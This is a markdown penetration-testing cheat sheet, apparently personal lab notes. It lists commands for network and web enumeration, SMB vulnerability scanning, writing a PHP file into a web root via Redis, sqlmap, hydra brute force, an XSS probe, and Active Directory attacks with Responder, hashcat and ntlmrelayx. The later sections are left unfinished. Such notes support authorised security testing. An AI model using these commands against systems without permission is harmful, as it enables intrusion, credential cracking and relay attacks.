## Initial Enumeration
### Nmap
```
nmap -sS -sC -oN initial_scan.txt {IP}  
nmap -sS -p- -oN all_ports.txt {IP}
```
```
Scripts
nmap -p 445 --script ms-sql-info <host>
nmap -p 1433 --script ms-sql-info --script-args mssql.instance-port=1433 <host>
nmap --script smb-enum-users.nse -p445 <host>
sudo nmap -sU -sS --script smb-enum-users.nse -p U:137,T:139 <host>
```
### Gobuster 
```
gobuster dir -u http://url -w /location/wordlist/file.txt  
gobuster vhost -u http://url -w /location/wordlist/file.txt  

/usr/share/seclists/Discovery/Web-Content/common.txt  
/usr/share/seclists/Discovery/Web-Content/big.txt  
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  
```


### Enum4Linux
```
enum4linux -e options http://[ip]
```

### HTTP Request Banner Grabbing
```
Using Netcat
nc <target ip> 80

This will connect to the webserver which will allow you to send a request command

Head / HTTP/1.0

Hit enter twice as all headers have two spaces between them and the request. This should then 
return the Header of the request

```
### SMB 
```
nmap -v -sS -p 445,139 -Pn --script smb-vuln* --script-args=unsafe=1 -oA smb_vuln_scan_192.168.189.42 192.168.189.42  

showmount -e 10.10.10.10  

smbclient -L 10.10.10.10

nmap -Pn -p445 - open - max-hostgroup 3 - smb-vuln-ms17-010 script <ip_netblock>

```
### Redis

```
Redis - 6379
nmap --script redis-info -sV -p 6379 <IP>

To check if the db is able to apply Server side execution run the following, then try to run the file from the browser.
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK

>info 
>get config *

https://book.hacktricks.xyz/pentesting/6379-pentesting-redis
```

### SQL
```
sqlmap -u http://192.168.202.163/login/index.php?id=1 --batch 
--batch bypasses all options when running commands

```

## Enumerating Discovered Ports

### 22 - SSH 
```
nc -vn <IP> 22
  
msf> use scanner/ssh/ssh_enumusers

hydra -L user.txt -P password.txt {IP} 22
```
  
### 21 FTP 
```
Anonymous Login Enabled
ftp {IP}
anonymous - Username
anonymous - Password 
  ls -al 
  
nmap --script ftp-* -p 21 <ip>

Downloads all files in FTP 
wget -m ftp://anonymous:anonymous@10.10.10.10

Connecting in a browser 
ftp://anonymous:anonymous@10.10.10.10
```

### 80/443 HTTP/HTTPS
#### Nikto 
```
nikto -h {URL}
nikto -h {URL} | tee nikto
```

## Subdomains 
### Sublister
```
sublist3r -d url.com
```

## XSS
### Testing if there is a xss vulnerability 
```
<script>alert("testing")</script>

```
```
xsser -u “http://192.168.169.130/xss/example1.php?name=hacker” -p (the_responce_from_the_field_intercepted_in_burp)
xsser -u “http://192.168.169.130/xss/example1.php?name=hacker” –auto –reverse-check -s
xsser -u “http://192.168.169.130/xss/example1.php?name=hacker” –heuristic
xsser –gtk - Launch interface
```

## Active Directory
### Initial Attack vectors
### LLMNR Poisoning
```
python Responder.py -l tun0 -rdw 
hashcat -m 5600 hashes.txt rockyou.txt
```
### SMB Relay
```
gedit Responder.conf
python Responder.py -l tun0 -rdw 
python ntlmrelayx.py -tf targets.txt -smb2support (wait for an event)
```

### Post Compromise Enumeration
#### Powerview
```
PowerView Cheat Sheet:  https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993!

#### Bloodhound
### Post Compromise Attacks






